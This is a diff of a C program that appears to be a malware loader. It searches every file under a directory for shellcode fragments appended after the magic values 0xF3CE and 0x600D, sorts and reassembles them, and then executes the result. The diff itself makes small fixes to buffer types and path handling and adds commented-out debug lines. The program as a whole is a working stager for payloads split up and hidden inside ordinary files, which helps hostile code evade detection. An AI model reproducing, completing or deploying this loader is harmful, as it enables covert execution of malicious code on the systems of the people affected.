@@ -34,9 +34,8 @@ int *bytechr(int *buf, int b, size_t bufsize) {
 int *find_magic_bytes_in_buf(int *buf, size_t bufsize) {
   int *magic_byte = NULL;
 
-  magic_byte = (int *)bytechr(buf, 0xF3CE, bufsize);
+  magic_byte = bytechr(buf, 0xF3CE, bufsize);
   while (magic_byte) {
-    printf("%x\n", *magic_byte);
     if (*magic_byte == 0xF3CE && *(magic_byte + 1) == 0x600D)
       return (magic_byte);
     buf = magic_byte + 1;
@@ -48,7 +47,7 @@ int *find_magic_bytes_in_buf(int *buf, size_t bufsize) {
 // Returns NULL if no shellcode found, otherwise returns a pointer to the file.
 FILE *detect_shellcode(char *path) {
   FILE *file;
-  char buf[BLKSIZE];
+  int buf[BLKSIZE];
   long offset;
   long file_size;
   int *magic_byte = NULL;
@@ -62,13 +61,14 @@ FILE *detect_shellcode(char *path) {
   offset = (file_size < BLKSIZE) ? file_size : BLKSIZE;
   while (fseek(file, -offset, SEEK_END) != -1) {
     bzero(buf, BLKSIZE);
-    if (fread(buf, sizeof(char), BLKSIZE, file) < 1) {
+    if (fread(buf, sizeof(int), BLKSIZE, file) < 1) {
       fclose(file);
       return (NULL);
     }
     magic_byte = find_magic_bytes_in_buf((int *)buf, BLKSIZE);
+    /* printf("Wow!: %ld\n", -(offset + (buf - (char *)magic_byte))); */
     if (magic_byte) {
-      fseek(file, -(offset + (buf - (char *)magic_byte)),  SEEK_END);
+      fseek(file, -(offset + (buf - magic_byte)),  SEEK_END);
       return (file);
     }
     offset += BLKSIZE;
@@ -88,6 +88,7 @@ t_list *find_shellcode_chunks(char *root_path) {
   files = find_files(root_path);
   if (!files || !files->data)
     return (NULL);
+  /* printf("%lu\n", list_count(files)); */
   list_ptr = files;
   while (list_ptr) {
     fp = detect_shellcode(((t_file *)list_ptr->data)->absolute_path);
@@ -175,15 +176,20 @@ t_shellcode *assemble_shellcode_chunks(t_list **chunks) {
 int main(int argc, char *argv[]) {
   t_shellcode *shellcode;
   t_list *shellcode_chunks;
+  char *root_path;
 
   if (argc != 2)
     return (1);
-  shellcode_chunks = find_shellcode_chunks(argv[1]);
+  root_path = realpath(argv[1], NULL);
+  if (!root_path)
+    return (1);
+  shellcode_chunks = find_shellcode_chunks(root_path);
   if (!shellcode_chunks)
     return (1);
   sort_chunks(shellcode_chunks);
   shellcode = assemble_shellcode_chunks(&shellcode_chunks);
   if (!shellcode)
     return (1);
+  /* DEBUG_print_shellcode(shellcode); */
   execute_shellcode(shellcode);
 }
